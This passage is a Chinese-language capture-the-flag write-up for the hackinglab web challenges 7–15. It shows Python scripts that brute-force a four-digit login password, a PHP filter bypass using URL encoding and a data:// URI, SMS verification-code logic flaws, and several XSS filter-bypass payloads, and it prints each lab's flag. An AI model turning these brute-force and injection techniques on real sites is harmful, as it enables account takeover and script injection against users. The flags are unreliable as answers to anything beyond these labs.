    s=requests.Session()  
    url="http://lab1.xseclab.com/vcode3_9d1ea7ad52ad93c04a837e0808b17097/login.php"  
    head={'session':'PHPSESSID=d369965b1284d87405231a4a5763cddc'}  
    for num in range(1000,10000):  
               data={'username':'admin','pwd':num,'vcode':'','submit':'submit'}  
               res=s.post(url,data=data,headers=head).content.decode('utf-8')  
               if u'pwd error' in res:  
                          print('正在尝试',num,'------密码错误!')  
               if u'vcode error' in res:  
                          print('验证码错误！')  
                          break  
               if u'error' not in res:  
                          print(num,'----密码破解成功！')  
                          print(res)  
                          break  
    第二个使用python2脚本
    import requests
    s = requests.Session()
    url = "http://lab1.xseclab.com/vcode3_9d1ea7ad52ad93c04a837e0808b17097/login.php"
    header = {"Cookie": "PHPSESSID=09462a3c9f8553aa536d87ab8b3c6614"}
    for pwd in range(1000,10000):
        payload = {'username': 'admin', 'pwd':pwd ,'vcode': ''}
        r = s.post(url,headers=header,data=payload).content
        if r.count("key"):
            print r,pwd
第三个使用burp爆破，方法同
## **8.微笑一下就能过关了**
url：
查看源代码我们可以发现一个超链接，打开这个超链接是PHP源代码，
发现必须满足以下条件
    1.必须对"^_^"赋值
    2."^_^"的值不能有 . % [0-9] http https ftp telnet 这些东西
    3.$_SERVER['QUERY_STRING'],即"^_^=(输入的值)"这个字符串不能有 _ 这个字符
    4.满足$smile!=0
    5.file_exists ($_GET['^_^'])必须为0.也就是$_GET['^_^']此文件不存在
    6."$smile"必须等于"(●'◡'●)".也就是file_get_contents($_GET['^_^'])必须为"(●'◡'●)"
    既要对"^_^"赋值,又得想办法去掉"^_^"中的"_",那么可以采用Url编码变为"%5f".所以我们输入就应该为 "^%5f^".
    代码把 http https ftp telnet 这些给过滤了,而又要求通过file_get_contents()取出$_GET['^_^']里的值.但,$_GET['^_^']又必须不存在.所以$_GET['^_^']只能是字符串"(●'◡'●)",不可能是文件名.那么file_get_contents()里的参数应该是啥呢.查了一下,发现data://完美符合.所以我们输入就应该为"^%5f^=data:,(●'◡'●)"
)
得到key：hkjasfhsa*&IUHKUH
## **9.逗比的手机验证码**
url :
点击获取验证码，并填入5141
返回之前的界面再获取一次验证码，换为这个手机号重新登陆
得到key is LJLJLGod!@@sd
## **10.基情燃烧的岁月**
url：
burp抓包，根据提示三位数密码 首位不为0，进行爆破，得到前任的手机号码是:13399999999
继续用13399999999进行爆破，得到flag is {LKK8*(!@@sd}
## **11.验证码识别**
url：
使用pkav神器
首先使用burp抓包，并且复制到pkav的请求包模块，进行设置
进行重放设置
验证码识别设置
重放选项设置
点击长度即可自动排序，得到flag{133dbc85dda4aa**)}
## **12.XSS基础关**
url：
右键查看源代码，点击[../xssjs/xss_check.php](http://lab1.xseclab.com/xssjs/xss_check.php)链接，查看代码
构造payload:
得到key is: myxssteststart!
## **13.XSS基础2:简单绕过**
url：
构造payload：
得到key is: xss2test2you
## **14.XSS基础3:检测与构造**
url：
第一个输入框中输入的内容提交后会写入第二个文本框内，但是写入前做了处理,当 value 为敏感字符串时，出现的敏感字符串反而不会被过滤
构造payload：
    alert' onmouseover=alert(HackingLab)>
得到key is: xss3test2youOK_striptag
## **15.Principle很重要的XSS**
url：
首先输入`javascript:alert(1)`，被屏蔽
尝试绕过 `javascript:alert(1)`
结果却被屏蔽，有以下两种情况：
1.后端代码是先匹配删除掉括号再进行的关键词查找
2.alert被屏蔽
先测试下第二个情况`javascript:alert(1)`
可以看到插入进去
并弹窗
构造payload：`javascript:alert(HackingLab)`
得到key is: xss4isnoteasy
另外的payload
空格 的情况有点特殊，应该是正则表达但是也是可以绕过的
只要空格前面有字符就会被屏蔽
那么我们把空格放在第一个
    test
正常通过
那么试试是不是屏蔽了所有空格
    test
事实证明只会屏蔽第一个空格
那么构建如下payload
    ' onmouseover=alert(HackingLab)>
    'onmouseover=alert(HackingLab)>
成功弹窗！
文笔生疏，措辞浅薄，望各位大佬不吝赐教，万分感谢。
免责声明：由于传播或利用此文所提供的信息、技术或方法而造成的任何直接或间接的后果及损失，均由使用者本人负责， 文章作者不为此承担任何责任。
转载声明：儒道易行
拥有对此文章的修改和解释权，如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章的内容，不得以任何方式将其用于商业目的。